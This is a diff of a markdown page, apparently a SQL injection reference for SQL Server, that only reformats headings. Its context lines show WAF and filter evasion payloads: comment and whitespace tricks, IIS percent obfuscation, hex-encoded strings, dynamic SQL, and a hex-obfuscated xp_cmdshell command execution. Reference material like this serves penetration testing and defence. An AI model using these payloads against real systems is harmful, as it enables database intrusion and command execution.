@@ -7,11 +7,9 @@ tags: ["obfuscation", "WAF bypass", "filter evasion"]
 lastUpdated: 2025-03-15
 ---
 
-## Fuzzing and Obfuscation
-
 Modern web applications often implement security measures like Web Application Firewalls (WAFs) and input filters to prevent SQL injection. Fuzzing and obfuscation techniques can help bypass these protections by disguising malicious SQL commands in ways that security tools may miss but the database will still execute.
 
-### Comment Variations
+## Comment Variations
 
 SQL Server supports various comment styles that can be used to break up SQL keywords:
 
@@ -27,7 +25,7 @@ username FROM users WHERE id = 1
 SELECT CHAR(10) username FROM users
 ```
 
-### Whitespace Manipulation
+## Whitespace Manipulation
 
 SQL Server is flexible with whitespace, allowing creative formatting:
 
@@ -45,7 +43,7 @@ SELECT%A0username%A0FROM%A0users
 SELECT       username       FROM       users
 ```
 
-### IIS/ASP Specific Obfuscation
+## IIS/ASP Specific Obfuscation
 
 In ASP(x) applications, percentage signs can be placed between characters to bypass filters, as IIS strips them before passing the query to the database:
 
@@ -57,7 +55,7 @@ S%E%L%E%C%T column FROM table
 A%%ND 1=%%%%%%%%1
 ```
 
-### Allowed Intermediary Characters (Whitespace)
+## Allowed Intermediary Characters (Whitespace)
 
 The following characters can be used instead of spaces:
 
@@ -98,7 +96,7 @@ The following characters can be used instead of spaces:
 
 **Note:** `%25` (percent sign) is not whitespace but can be used for obfuscation in IIS/ASP environments (see IIS/ASP Specific Obfuscation section above).
 
-### Characters Avoiding Spaces
+## Characters Avoiding Spaces
 
 These characters can replace spaces in certain contexts:
 
@@ -108,7 +106,7 @@ These characters can replace spaces in certain contexts:
 | `(` `)`   | Parentheses  | `UNION(SELECT(column)FROM(table))`                     |
 | `[` `]`   | Brackets     | `SELECT[column_name]FROM[information_schema].[tables]` |
 
-### Characters After AND/OR
+## Characters After AND/OR
 
 The following characters can appear immediately after AND/OR:
 
@@ -128,7 +126,7 @@ Example (`\` denotes a space character per the table above):
 SELECT 1 FROM[table]WHERE\1=\1AND\1=\1
 ```
 
-### Case Variation
+## Case Variation
 
 SQL Server keywords are case-insensitive:
 
@@ -137,7 +135,7 @@ select USERNAME from USERS where ID=1
 SeLeCt UsErNaMe FrOm UsErS wHeRe Id=1
 ```
 
-### Operator Alternatives
+## Operator Alternatives
 
 Some operators have alternative representations:
 
@@ -156,7 +154,7 @@ id=1
 id<=>1  -- Works in some contexts
 ```
 
-### String Representation
+## String Representation
 
 Strings can be represented in multiple ways:
 
@@ -177,7 +175,7 @@ SELECT 0x61646D696E -- 'admin'
 SELECT N'admin'
 ```
 
-### Numeric Representation
+## Numeric Representation
 
 Numbers can be represented in various ways:
 
@@ -195,7 +193,7 @@ SELECT * FROM users WHERE id = (SELECT 1)
 SELECT * FROM users WHERE id = 0x1 -- hex for 1
 ```
 
-### Function Call Obfuscation
+## Function Call Obfuscation
 
 Function names can be obfuscated using dynamic SQL:
 
@@ -209,9 +207,9 @@ DECLARE @t varchar(100) = QUOTENAME('users')
 EXEC('SELECT * FROM ' + @t)
 ```
 
-### Using SQL Server-Specific Features
+## Using SQL Server-Specific Features
 
-#### Using Extended Stored Procedures
+### Using Extended Stored Procedures
 
 ```sql
 -- Using xp_cmdshell indirectly
@@ -219,7 +217,7 @@ DECLARE @x varchar(100) = 0x78705F636D647368656C6C -- hex for 'xp_cmdshell'
 EXEC('EXEC ' + @x + ' ''dir''')
 ```
 
-#### Using Cast and Convert
+### Using Cast and Convert
 
 ```sql
 -- Using CAST to obfuscate
@@ -229,9 +227,9 @@ SELECT * FROM users WHERE id = CAST(0x31 AS int) -- 0x31 is hex for '1'
 SELECT * FROM users WHERE id = CONVERT(int, 0x31)
 ```
 
-### WAF Bypass Techniques
+## WAF Bypass Techniques
 
-#### Special Characters and Encodings
+### Special Characters and Encodings
 
 ````sql
 -- URL encoding (depends on how application processes input)
